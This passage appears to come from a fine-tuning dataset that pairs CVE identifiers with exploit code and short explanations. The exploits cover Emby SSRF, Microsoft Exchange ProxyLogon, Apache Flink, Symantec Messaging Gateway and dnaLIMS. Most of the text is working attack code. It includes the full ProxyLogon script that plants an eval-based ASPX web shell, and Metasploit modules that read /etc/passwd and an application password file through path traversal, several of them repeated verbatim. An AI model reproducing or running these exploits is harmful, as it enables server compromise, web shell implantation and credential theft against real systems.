vprint_error(\"#{target_host}:#{p} No webpage body\") if res.body.nil?      # Very basic, just match the first title tag we come to. If the match fails,      # there is no chance that we will have a title      rx = %r{<title>[\\\t\\s]*(?<title>.+?)[\\s\\\t]*</title>}im.match(res.body.to_s)      unless rx        vprint_error(\"#{target_host}:#{p} No webpage title\")        next      end      # Last bit of logic to capture the title      rx[:title].strip!      if rx[:title].empty?        vprint_error(\"#{target_host}:#{p} No webpage title\")        next      end      rx_title = Rex::Text.html_decode(rx[:title])      if datastore['SHOW_TITLES']        print_good(\"#{target_host}:#{p} Title: #{rx_title}\")        print_good(\"#{target_host}:#{p}     HTTP Code: #{res.code}\")        print_good(\"#{target_host}:#{p}     Location Header: #{location_header}\")        print_good(\"#{target_host}:#{p}     Server Header: #{server_header}\")      end      if datastore['STORE_NOTES']        notedata = { code: res.code, port: p, server: server_header, title: rx_title, redirect: location_header }        report_note(host: target_host, port: p, type: 'http.title', data: notedata, update: :unique_data)      end    end  endend       Question: CVE-2020-26948[/INST] CVE-2020-26948 is a vulnerability affecting Emby Media Server. It is an SSRF (Server Side Request Forgery) issue where an attacker can generate a GET request to the provided web servers and execute an SSRF attack against the targeted Emby server. This vulnerability allows an attacker to retrieve the server header, HTML title attribute, and location header, which can be helpful for identifying web applications on the internal network.To exploit this vulnerability, the Metasploit Module scans specified ports and sends a crafted request to the Emby server. The module retrieves the headers to capture the Location and Server header and performs some basic checks to ensure the data is submitted. If successful, the module prints the title, HTTP code, location header, and server header on the console or stores the information in notes."}
{"query": "CVE-2021-26855", "Answer": "EXPLOIT: # Exploit Title: Microsoft Exchange 2019 - SSRF to Arbitrary File Write (Proxylogon)# Date: 2021-03-10# Exploit Author: testanull# Vendor Homepage: https://www.microsoft.com# Version: MS Exchange Server 2013, 2016, 2019# CVE: 2021-26855, 2021-27065import requestsfrom urllib3.exceptions import InsecureRequestWarningimport randomimport stringimport sys# Code for: def id_generator(size=6, chars=string.ascii_lowercase + string.digits):if len(sys.argv) < 2:\tprint(\"Usage: python PoC.py <target> <email>\")\tprint(\"Example: python PoC.py mail.evil.corp haxor@evil.corp\")\texit()requests.packages.urllib3.disable_warnings(category=InsecureRequestWarning)target = sys.argv[1]email = sys.argv[2]random_name = id_generator(3) + \".js\"user_agent = \"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36\"shell_path = \"Program Files\\\\Microsoft\\\\Exchange Server\\\\V15\\\\FrontEnd\\\\HttpProxy\\\\owa\\\\auth\\\\ahihi.aspx\"shell_absolute_path = \"\\\\\\\\127.0.0.1\\\\c$\\\\%s\" % shell_pathshell_content = '<script language=\"JScript\" runat=\"server\"> function Page_Load(){/**/eval(Request[\"exec_code\"],\"unsafe\");}</script>'legacyDnPatchByte = \"68747470733a2f2f696d6775722e636f6d2f612f7a54646e5378670a0a0a0a0a0a0a0a\"autoDiscoverBody = \"\"\"<Autodiscover xmlns=\"http://schemas.microsoft.com/exchange/autodiscover/outlook/requestschema/2006\">    <Request>      <EMailAddress>%s</EMailAddress> <AcceptableResponseSchema>http://schemas.microsoft.com/exchange/autodiscover/outlook/responseschema/2006a</AcceptableResponseSchema>    </Request></Autodiscover>\"\"\" % emailprint(\"Attacking target \" + target)print(\"=============================\")print(legacyDnPatchByte.decode('hex'))FQDN = \"EXCHANGE\"ct = requests.get(\"https://%s/ecp/%s\" % (target, random_name), headers={\"Cookie\": \"X-BEResource=localhost~1942062522\",            \"User-Agent\": user_agent},   verify=False)if \"X-CalculatedBETarget\" in ct.headers and \"X-FEServer\" in ct.headers:    FQDN = ct.headers[\"X-FEServer\"]ct = requests.post(\"https://%s/ecp/%s\" % (target, random_name), headers={    \"Cookie\": \"X-BEResource=%s/autodiscover/autodiscover.xml?a=~1942062522;\" % FQDN,    \"Content-Type\": \"text/xml\",    \"User-Agent\": user_agent},    data=autoDiscoverBody,    verify=False    )if ct.status_code != 200:    print(\"Autodiscover Error!\")    exit()if \"<LegacyDN>\" not in ct.content:    print(\"Can not get LegacyDN!\")    exit()legacyDn = ct.content.split(\"<LegacyDN>\")[1].split(\"</LegacyDN>\")[0]print(\"Got DN: \" + legacyDn)mapi_body = legacyDn + \"\\x00\\x00\\x00\\x00\\x00\\xe4\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x09\\x04\\x00\\x00\\x00\\x00\\x00\\x00\"ct = requests.post(\"https://%s/ecp/%s\" % (target, random_name), headers={    \"Cookie\": \"X-BEResource=Admin@%s:444/mapi/emsmdb?MailboxId=f26bc937-b7b3-4402-b890-96c46713e5d5@exchange.lab&a=~1942062522;\" % FQDN,    \"Content-Type\": \"application/mapi-http\",    \"User-Agent\": user_agent},    data=mapi_body,    verify=False    )if ct.status_code != 200 or \"act as owner of a UserMailbox\" not in ct.content:    print(\"Mapi Error!\")    exit()sid = ct.content.split(\"with SID \")[1].split(\" and MasterAccountSid\")[0]print(\"Got SID: \" + sid)proxyLogon_request = \"\"\"<r at=\"Negotiate\" ln=\"john\"><s>%s</s><s a=\"7\" t=\"1\">S-1-1-0</s><s a=\"7\" t=\"1\">S-1-5-2</s><s a=\"7\" t=\"1\">S-1-5-11</s><s a=\"7\" t=\"1\">S-1-5-15</s><s a=\"3221225479\" t=\"1\">S-1-5-5-0-6948923</s></r>\"\"\" % sidct = requests.post(\"https://%s/ecp/%s\" % (target, random_name), headers={    \"Cookie\": \"X-BEResource=Admin@%s:444/ecp/proxyLogon.ecp?a=~1942062522;\" % FQDN,    \"Content-Type\": \"text/xml\",    \"User-Agent\": user_agent},    data=proxyLogon_request,    verify=False    )if ct.status_code != 241 or not \"set-cookie\" in ct.headers:    print(\"Proxylogon Error!\")    exit()sess_id = ct.headers['set-cookie'].split(\"ASP.NET_SessionId=\")[1].split(\";\")[0]msExchEcpCanary = ct.headers['set-cookie'].split(\"msExchEcpCanary=\")[1].split(\";\")[0]print(\"Got session id: \" + sess_id)print(\"Got canary: \" + msExchEcpCanary)ct = requests.get(\"https://%s/ecp/%s\" % (target, random_name), headers={    \"Cookie\": \"X-BEResource=Admin@%s:444/ecp/about.aspx?a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s\" % (        FQDN, sess_id, msExchEcpCanary),    \"User-Agent\": user_agent},   verify=False   )if ct.status_code != 200:    print(\"Wrong canary!\")    print(\"Sometime we can skip this ...\")rbacRole = ct.content.split(\"RBAC roles:</span> <span class='diagTxt'>\")[1].split(\"</span>\")[0]# print \"Got rbacRole: \"+ rbacRoleprint(\"=========== It means good to go!!!====\")ct = requests.post(\"https://%s/ecp/%s\" % (target, random_name), headers={    \"Cookie\": \"X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/GetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s\" % (        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),    \"Content-Type\": \"application/json; charset=utf-8\",    \"User-Agent\": user_agent},    json={\"filter\": {        \"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\",        \"SelectedView\": \"\", \"SelectedVDirType\": \"All\"}}, \"sort\": {}},    verify=False    )if ct.status_code != 200:    print(\"GetOAB Error!\")    exit()oabId = ct.content.split('\"RawIdentity\":\"')[1].split('\"')[0]print(\"Got OAB id: \" + oabId)oab_json = {\"identity\": {\"__type\": \"Identity:ECP\", \"DisplayName\": \"OAB (Default Web Site)\", \"RawIdentity\": oabId},            \"properties\": { \"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\", \"ExternalUrl\": \"http://ffff/#%s\" % shell_content}}}ct = requests.post(\"https://%s/ecp/%s\" % (target, random_name), headers={    \"Cookie\": \"X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=OABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s\" % (        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),    \"Content-Type\": \"application/json; charset=utf-8\",    \"User-Agent\": user_agent},    json=oab_json,    verify=False    )if ct.status_code != 200:    print(\"Set external url Error!\")    exit()reset_oab_body = {\"identity\": {\"__type\": \"Identity:ECP\", \"DisplayName\": \"OAB (Default Web Site)\", \"RawIdentity\": oabId},   \"properties\": {       \"Parameters\": {\"__type\": \"JsonDictionaryOfanyType:#Microsoft.Exchange.Management.ControlPanel\",       \"FilePathName\": shell_absolute_path}}}ct = requests.post(\"https://%s/ecp/%s\" % (target, random_name), headers={    \"Cookie\": \"X-BEResource=Admin@%s:444/ecp/DDI/DDIService.svc/SetObject?schema=ResetOABVirtualDirectory&msExchEcpCanary=%s&a=~1942062522; ASP.NET_SessionId=%s; msExchEcpCanary=%s\" % (        FQDN, msExchEcpCanary, sess_id, msExchEcpCanary),    \"Content-Type\": \"application/json; charset=utf-8\",    \"User-Agent\": user_agent},    json=reset_oab_body,    verify=False    )if ct.status_code != 200:    print(\"Write Shell Error!\")    exit()print(\"Successful!\")       Question: CVE-2021-26855[/INST] CVE-2021-26855 is a vulnerability in Microsoft Exchange Server 2013, 2016, and 2019. It is an SSRF (Server Side Request Forgery) vulnerability in the proxylogon feature of Exchange Server. An attacker can abuse this vulnerability to perform unauthorized actions on the targeted Exchange Server, including writing arbitrary files. To exploit this vulnerability, an attacker needs to send specially crafted requests to the Exchange Server, impersonating a legitimate user. Once successful, the attacker gains the ability to write files to the server under specific conditions.This particular proof-of-concept (PoC) code demonstrates how to exploit this vulnerability by creating a JavaScript file, sending autodiscover requests to obtain the LegacyDN, then uses that information to create a Mailbox object and assign it a new role. Afterward, the attacker sets a new URL for the Offline Address Book (OAB) Virtual Directory, pointing it to their malicious content. Finally, the attacker resets the OAB Virtual Directory to make the change permanent.It should be noted that exploiting this vulnerability could lead to serious consequences, including data loss or unauthorized access to sensitive information. Therefore, it is essential to ensure your Microsoft Exchange Servers are updated to the latest patches to mitigate this risk."}
{"query": "CVE-2020-17519", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Apache Flink JobManager Traversal',        'Description' => %q{          This module exploits an unauthenticated directory traversal vulnerability          in Apache Flink versions 1.11.0 <= 1.11.2. The JobManager REST API fails          to validate user-supplied log file paths, allowing retrieval of arbitrary          files with the privileges of the web server user.          This module has been tested successfully on Apache Flink version 1.11.2          on Ubuntu 18.04.4.        },        'Author' => [          '0rich1 - Ant Security FG Lab', # Vulnerability discovery          'Hoa Nguyen - Suncsr Team', # Metasploit module          'bcoles', # Metasploit module cleanup and improvements        ],        'License' => MSF_LICENSE,        'References' => [          ['CVE', '2020-17519'],          ['CWE', '22'],          ['EDB', '49398'],          ['PACKETSTORM', '160849'],          ['URL', 'https://www.openwall.com/lists/oss-security/2021/01/05/2'],          ['URL', 'https://www.tenable.com/cve/CVE-2020-17519']        ],        'DefaultOptions' => { 'RPORT' => 8081 },        'DisclosureDate' => '2021-01-05',        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        }      )    )    register_options([      OptInt.new('DEPTH', [ true, 'Depth for path traversal', 10]),      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])    ])  end  def check_host(_ip)    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'config')    })    unless res      return Exploit::CheckCode::Unknown('No reply.')    end    unless res.body.include?('flink')      return Exploit::CheckCode::Safe('Target is not Apache Flink.')    end    version = res.get_json_document['flink-version']    if version.blank?      return Exploit::CheckCode::Detected('Could not determine Apache Flink software version.')    end    if Rex::Version.new(version).between?(Rex::Version.new('1.11.0'), Rex::Version.new('1.11.2'))      return Exploit::CheckCode::Appears(\"Apache Flink version #{version} appears vulnerable.\")    end    Exploit::CheckCode::Safe(\"Apache Flink version #{version} is not vulnerable.\")  end  def retrieve_file(depth, filepath)    traversal = Rex::Text.uri_encode(Rex::Text.uri_encode(\"#{'../' * depth}#{filepath}\", 'hex-all'))    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'jobmanager', 'logs', traversal)    })    unless res      print_error('No reply')      return    end    if res.code == 404      print_error('File not found')      return    end    if res.code == 500      print_error(\"Unexpected reply (HTTP #{res.code}): Server encountered an error attempting to read file\")      msg = res.body.scan(/Caused by: (.+?)\\\/).flatten.last      print_error(msg) if msg      return    end    if res.code != 200      print_error(\"Unexpected reply (HTTP #{res.code})\")      return    end    res.body.to_s  end  def run_host(ip)    depth = datastore['DEPTH']    filepath = datastore['FILEPATH']    print_status(\"Downloading #{filepath} ...\")    res = retrieve_file(depth, filepath)    return if res.blank?    print_good(\"Downloaded #{filepath} (#{res.length} bytes)\")    path = store_loot(      'apache.flink.jobmanager.traversal',      'text/plain',      ip,      res,      File.basename(filepath)    )    print_good(\"File #{filepath} saved in: #{path}\")  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Apache Flink JobManager Traversal',        'Description' => %q{          This module exploits an unauthenticated directory traversal vulnerability          in Apache Flink versions 1.11.0 <= 1.11.2. The JobManager REST API fails          to validate user-supplied log file paths, allowing retrieval of arbitrary          files with the privileges of the web server user.          This module has been tested successfully on Apache Flink version 1.11.2          on Ubuntu 18.04.4.        },        'Author' => [          '0rich1 - Ant Security FG Lab', # Vulnerability discovery          'Hoa Nguyen - Suncsr Team', # Metasploit module          'bcoles', # Metasploit module cleanup and improvements        ],        'License' => MSF_LICENSE,        'References' => [          ['CVE', '2020-17519'],          ['CWE', '22'],          ['EDB', '49398'],          ['PACKETSTORM', '160849'],          ['URL', 'https://www.openwall.com/lists/oss-security/2021/01/05/2'],          ['URL', 'https://www.tenable.com/cve/CVE-2020-17519']        ],        'DefaultOptions' => { 'RPORT' => 8081 },        'DisclosureDate' => '2021-01-05',        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        }      )    )    register_options([      OptInt.new('DEPTH', [ true, 'Depth for path traversal', 10]),      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])    ])  end  def check_host(_ip)    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'config')    })    unless res      return Exploit::CheckCode::Unknown('No reply.')    end    unless res.body.include?('flink')      return Exploit::CheckCode::Safe('Target is not Apache Flink.')    end    version = res.get_json_document['flink-version']    if version.blank?      return Exploit::CheckCode::Detected('Could not determine Apache Flink software version.')    end    if Rex::Version.new(version).between?(Rex::Version.new('1.11.0'), Rex::Version.new('1.11.2'))      return Exploit::CheckCode::Appears(\"Apache Flink version #{version} appears vulnerable.\")    end    Exploit::CheckCode::Safe(\"Apache Flink version #{version} is not vulnerable.\")  end  def retrieve_file(depth, filepath)    traversal = Rex::Text.uri_encode(Rex::Text.uri_encode(\"#{'../' * depth}#{filepath}\", 'hex-all'))    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'jobmanager', 'logs', traversal)    })    unless res      print_error('No reply')      return    end    if res.code == 404      print_error('File not found')      return    end    if res.code == 500      print_error(\"Unexpected reply (HTTP #{res.code}): Server encountered an error attempting to read file\")      msg = res.body.scan(/Caused by: (.+?)\\\/).flatten.last      print_error(msg) if msg      return    end    if res.code != 200      print_error(\"Unexpected reply (HTTP #{res.code})\")      return    end    res.body.to_s  end  def run_host(ip)    depth = datastore['DEPTH']    filepath = datastore['FILEPATH']    print_status(\"Downloading #{filepath} ...\")    res = retrieve_file(depth, filepath)    return if res.blank?    print_good(\"Downloaded #{filepath} (#{res.length} bytes)\")    path = store_loot(      'apache.flink.jobmanager.traversal',      'text/plain',      ip,      res,      File.basename(filepath)    )    print_good(\"File #{filepath} saved in: #{path}\")  endend       Question: CVE-2020-17519[/INST] CVE-2020-17519 is an unauthenticated directory traversal vulnerability affecting Apache Flink versions 1.11.0 to 1.11.2. This vulnerability allows an attacker to retrieve arbitrary files with the privileges of the web server user by manipulating the user-supplied log file paths sent to the JobManager REST API.Metasploit Module:Here's a Metasploit module that takes advantage of this vulnerability. It includes options for setting the depth of the path traversal and the target file to be retrieved.```rubyrequire 'msf/core'class MetasploitModule < Msf::Auxiliary  include Msf::Exploit::Remote::HttpClient  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  def initialize(info = {})    super(      update_info(        info,        'Name' => 'Apache Flink JobManager Traversal',        'Description' => %q{          This module exploits an unauthenticated directory traversal vulnerability          in Apache Flink versions 1.11.0 <= 1.11.2. The JobManager REST API fails          to validate user-supplied log file paths, allowing retrieval of arbitrary          files with the privileges of the web server user.          This module has been tested successfully on Apache Flink version 1.11.2          on Ubuntu 18.04.4.        },        'Author' => [          '0rich1 - Ant Security FG Lab', # Vulnerability discovery          'Hoa Nguyen - Suncsr Team', # Metasploit module          'bcoles', # Metasploit module cleanup and improvements        ],        'License' => MSF_LICENSE,        'References' => [          ['CVE', '2020-17519'],          ['CWE', '22'],          ['EDB', '49398'],          ['PACKETSTORM', '160849'],          ['URL', 'https://www.openwall.com/lists/oss-security/2021/01/05/2'],          ['URL', 'https://www.tenable.com/cve/CVE-2020-17519']        ],        'DefaultOptions' => { 'RPORT' => 8081 },        'DisclosureDate' => '2021-01-05',        'Notes' => {          'Stability' => [CRASH_SAFE],          'Reliability' => [],          'SideEffects' => [IOC_IN_LOGS]        }      )    )    register_options([      OptInt.new('DEPTH', [ true, 'Depth for path traversal', 10 ]),      OptString.new('FILEPATH', [true, 'The path to the file to read', '/etc/passwd'])    ])  end  def check_host(_ip)    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'config')    })    unless res      return Exploit::CheckCode::Unknown('No reply.')    end    unless res.body.include?('flink')      return Exploit::CheckCode::Safe('Target is not Apache Flink.')    end    version = res.get_json_document['flink-version']    if version.blank?      return Exploit::CheckCode::Detected('Could not determine Apache Flink software version.')    end    if Rex::Version.new(version).between?(Rex::Version.new('1.11.0'), Rex::Version.new('1.11.2'))      return Exploit::CheckCode::Appears(\"Apache Flink version #{version} appears vulnerable.\")    end    Exploit::CheckCode::Safe(\"Apache Flink version #{version} is not vulnerable.\")  end  def retrieve_file(depth, filepath)    traversal = Rex::Text.uri_encode(Rex::Text.uri_encode(\"#{'../' * depth}#{filepath}\", 'hex-all'))    res = send_request_cgi({      'method' => 'GET',      'uri' => normalize_uri(target_uri.path, 'jobmanager', 'logs', traversal)    })    unless res      print_error('No reply')      return    end    if res.code == 404      print_error('File not found')      return    end    if res.code == 500      print_error(\"Unexpected reply (HTTP #{res.code}): Server encountered an error attempting to read file\")      msg = res.body.scan(/Caused by: (.+?)\\\/).flatten.last      print_error(msg) if msg      return    end    if res.code != 200      print_error(\"Unexpected reply (HTTP #{res.code})\")      return    end    res.body.to_s  end  def run_host(ip)    depth = datastore['DEPTH']    filepath = datastore['FILEPATH']    print_status(\"Downloading #{filepath} ...\")    res = retrieve_file(depth, filepath)    return if res.blank?    print_good(\"Downloaded #{filepath} (#{res.length} bytes)\")    path = store_loot(      'apache.flink.jobmanager.traversal',      'text/plain',      ip,      res,      File.basename(filepath)    )    print_good(\"File #{filepath} saved in: #{path}\")  endend```Usage:You can use this Metasploit module by starting the msfconsole and then executing `use apache_flink_jobmanager_traversal`. Set the desired options, such as depth and FILEPATH, and then run the module against the target IP address using the `run` command."}
{"query": "CVE-2012-4347", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'Symantec Messaging Gateway 9.5 Log File Download Vulnerability',      'Description'    => %q{          This module will download a file of your choice against Symantec Messaging        Gateway.  This is possible by exploiting a directory traversal vulnerability        when handling the 'logFile' parameter, which will load an arbitrary file as        an attachment.  Note that authentication is required in order to successfully        download your file.      },      'References'     =>        [          ['CVE', '2012-4347'],          ['EDB', '23110'],          ['OSVDB', '88165'],          ['BID', '56789'],          ['URL', 'https://www.broadcom.com/support/security-center/securityupdates/detail?fid=security_advisory&pvid=security_advisory&suid=20120827_00&year=2012']        ],      'Author'         =>        [          'Ben Williams <ben.williams[at]ngssecure.com>',          'sinn3r'        ],      'License'        => MSF_LICENSE,      'DisclosureDate' => '2012-11-30'    ))    register_options(      [        Opt::RPORT(41080),        OptString.new('FILENAME', [true, 'The file to download', '/etc/passwd']),        OptString.new('USERNAME', [true, 'The username to login as']),        OptString.new('PASSWORD', [true, 'The password to login with'])      ])  end  def auth(username, password, sid, last_login)    res = send_request_cgi({      'method'    => 'POST',      'uri'       => '/brightmail/login.do',      'headers'   => {        'Referer' => \"http://#{peer}/brightmail/viewLogin.do\"      },      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",      'vars_post' => {        'lastlogin'  => last_login,        'userLocale' => '',        'lang'       => 'en_US',        'username'   => username,        'password'   => password,        'loginBtn'   => 'Login'      }    })    if res and res.headers['Location']      new_uri = res.headers['Location'].scan(/^http:\\/\\/[\\d\\.]+:\\d+(\\/.+)/).flatten[0]      res = send_request_cgi({        'uri'    => new_uri,        'cookie' => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\"      })      return true if res and res.body =~ /Logged in as: #{username}/    end    return false  end  def get_login_data    sid        = ''  #From cookie    last_login = ''  #A hidden field in the login page    res = send_request_raw({'uri'=>'/brightmail/viewLogin.do'})    if res and !res.get_cookies.empty?      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''    end    if res      last_login = res.body.scan(/<input type=\"hidden\" name=\"lastlogin\" value=\"(.+)\"\\/>/).flatten[0] || ''    end    return sid, last_login  end  def download_file(sid, fname)    res = send_request_cgi({      'uri'      => '/brightmail/export',      'cookie'   => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",      'vars_get' => {        'type'        => 'logs',        'logFile'     => \"../../#{fname}\",        'logType'     => '1',        'browserType' => '1'      }    })    if not res      print_error(\"Unable to download the file. The server timed out.\")      return    elsif res and res.body.empty?      print_error(\"File not found or empty.\")      return    end    vprint_line    vprint_line(res.body)    f = ::File.basename(fname)    p = store_loot('symantec.brightmail.file', 'application/octet-stream', rhost, res.body, f)    print_good(\"File saved as: '#{p}'\")  end  def run_host(ip)    sid, last_login = get_login_data    if sid.empty? or last_login.empty?      print_error(\"Missing required login data.  Cannot continue.\")      return    end    username = datastore['USERNAME']    password = datastore['PASSWORD']    if not auth(username, password, sid, last_login)      print_error(\"Unable to login.  Cannot continue.\")      return    else      print_good(\"Logged in as '#{username}:#{password}'\")    end    fname = datastore['FILENAME']    download_file(sid, fname)  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'Symantec Messaging Gateway 9.5 Log File Download Vulnerability',      'Description'    => %q{          This module will download a file of your choice against Symantec Messaging        Gateway.  This is possible by exploiting a directory traversal vulnerability        when handling the 'logFile' parameter, which will load an arbitrary file as        an attachment.  Note that authentication is required in order to successfully        download your file.      },      'References'     =>        [          ['CVE', '2012-4347'],          ['EDB', '23110'],          ['OSVDB', '88165'],          ['BID', '56789'],          ['URL', 'https://www.broadcom.com/support/security-center/securityupdates/detail?fid=security_advisory&pvid=security_advisory&suid=20120827_00&year=2012']        ],      'Author'         =>        [          'Ben Williams <ben.williams[at]ngssecure.com>',          'sinn3r'        ],      'License'        => MSF_LICENSE,      'DisclosureDate' => '2012-11-30'    ))    register_options(      [        Opt::RPORT(41080),        OptString.new('FILENAME', [true, 'The file to download', '/etc/passwd']),        OptString.new('USERNAME', [true, 'The username to login as']),        OptString.new('PASSWORD', [true, 'The password to login with'])      ])  end  def auth(username, password, sid, last_login)    res = send_request_cgi({      'method'    => 'POST',      'uri'       => '/brightmail/login.do',      'headers'   => {        'Referer' => \"http://#{peer}/brightmail/viewLogin.do\"      },      'cookie'    => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",      'vars_post' => {        'lastlogin'  => last_login,        'userLocale' => '',        'lang'       => 'en_US',        'username'   => username,        'password'   => password,        'loginBtn'   => 'Login'      }    })    if res and res.headers['Location']      new_uri = res.headers['Location'].scan(/^http:\\/\\/[\\d\\.]+:\\d+(\\/.+)/).flatten[0]      res = send_request_cgi({        'uri'    => new_uri,        'cookie' => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\"      })      return true if res and res.body =~ /Logged in as: #{username}/    end    return false  end  def get_login_data    sid        = ''  #From cookie    last_login = ''  #A hidden field in the login page    res = send_request_raw({'uri'=>'/brightmail/viewLogin.do'})    if res and !res.get_cookies.empty?      sid = res.get_cookies.scan(/JSESSIONID=([a-zA-Z0-9]+)/).flatten[0] || ''    end    if res      last_login = res.body.scan(/<input type=\"hidden\" name=\"lastlogin\" value=\"(.+)\"\\/>/).flatten[0] || ''    end    return sid, last_login  end  def download_file(sid, fname)    res = send_request_cgi({      'uri'      => '/brightmail/export',      'cookie'   => \"userLanguageCode=en; userCountryCode=US; JSESSIONID=#{sid}\",      'vars_get' => {        'type'        => 'logs',        'logFile'     => \"../../#{fname}\",        'logType'     => '1',        'browserType' => '1'      }    })    if not res      print_error(\"Unable to download the file. The server timed out.\")      return    elsif res and res.body.empty?      print_error(\"File not found or empty.\")      return    end    vprint_line    vprint_line(res.body)    f = ::File.basename(fname)    p = store_loot('symantec.brightmail.file', 'application/octet-stream', rhost, res.body, f)    print_good(\"File saved as: '#{p}'\")  end  def run_host(ip)    sid, last_login = get_login_data    if sid.empty? or last_login.empty?      print_error(\"Missing required login data.  Cannot continue.\")      return    end    username = datastore['USERNAME']    password = datastore['PASSWORD']    if not auth(username, password, sid, last_login)      print_error(\"Unable to login.  Cannot continue.\")      return    else      print_good(\"Logged in as '#{username}:#{password}'\")    end    fname = datastore['FILENAME']    download_file(sid, fname)  endend       Question: CVE-2012-4347[/INST] CVE-2012-4347 is a vulnerability affecting Symantec Messaging Gateway version 9.5. It allows an attacker to download any file of their choice by exploiting a directory traversal vulnerability in the 'logFile' parameter. Authentication is required to successfully download the file.This vulnerability can be exploited using a Metasploit module, as shown in the provided code snippet. The module includes functions like `auth` for logging in to the Symantec Messaging Gateway, `get_login_data` for retrieving necessary login details, and `download_file` for downloading the desired file once logged in. The `run_host` function brings everything together by performing the login and file download sequence."}
{"query": "CVE-2017-6527", "Answer": "METASPLOIT: ### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'DnaLIMS Directory Traversal',      'Description'    => %q{          This module exploits a directory traversal vulnerability found in dnaLIMS.        Due to the way the viewAppletFsa.cgi script handles the 'secID' parameter, it is possible        to read a file outside the www directory.      },      'References'     =>        [          ['CVE', '2017-6527'],          ['US-CERT-VU', '929263'],          ['URL', 'https://www.shorebreaksecurity.com/blog/product-security-advisory-psa0002-dnalims/']        ],      'Author'         =>        [          'h00die <mike@shorebreaksecurity.com>',    # Discovery, PoC          'flakey_biscuit <nicholas@shorebreaksecurity.com>'  # Discovery, PoC        ],      'License'        => MSF_LICENSE,      'DisclosureDate' => '2017-03-08'    ))    register_options(      [        OptString.new('TARGETURI', [true, 'The base path to dnaLIMS', '/cgi-bin/dna/']),        OptString.new('FILE', [ true,  \"The path to the file to view\", '/home/dna/spool/.pfile']), # password db for app        OptInt.new('DEPTH', [true, 'The traversal depth', 4])      ])  end  def run_host(ip)    file     = (datastore['FILE'][0,1] == '/') ? datastore['FILE'] : \"#{datastore['FILE']}\"    traverse = \"../\" * datastore['DEPTH']    uri      = normalize_uri(target_uri.path)    base     = File.dirname(\"#{uri}/.\")    print_status(\"Requesting: #{file} - #{rhost}\")    res = send_request_cgi({      'uri'      => \"#{base}/viewAppletFsa.cgi\",      'vars_get' => { 'secID' => \"#{traverse}#{file}%00\",      'Action' => 'blast',     'hidenav' => '1'      }    })    if not res      print_error(\"No response from server.\")      return    end    if res.code != 200      print_error(\"Server returned a non-200 response (body will not be saved):\")      print_line(res.to_s)      return    end    vprint_good(res.body)    p = store_loot('dnaLIMS.traversal.file', 'application/octet-stream', ip, res.body, File.basename(file))    print_good(\"File saved as: #{p}\")  endend### This module requires Metasploit: https://metasploit.com/download# Current source: https://github.com/rapid7/metasploit-framework##class MetasploitModule < Msf::Auxiliary  include Msf::Auxiliary::Scanner  include Msf::Auxiliary::Report  include Msf::Exploit::Remote::HttpClient  def initialize(info = {})    super(update_info(info,      'Name'           => 'DnaLIMS Directory Traversal',      'Description'    => %q{          This module exploits a directory traversal vulnerability found in dnaLIMS.        Due to the way the viewAppletFsa.cgi script handles the 'secID' parameter, it is possible        to read a file outside the www directory.      },      'References'     =>        [          ['CVE', '2017-6527'],          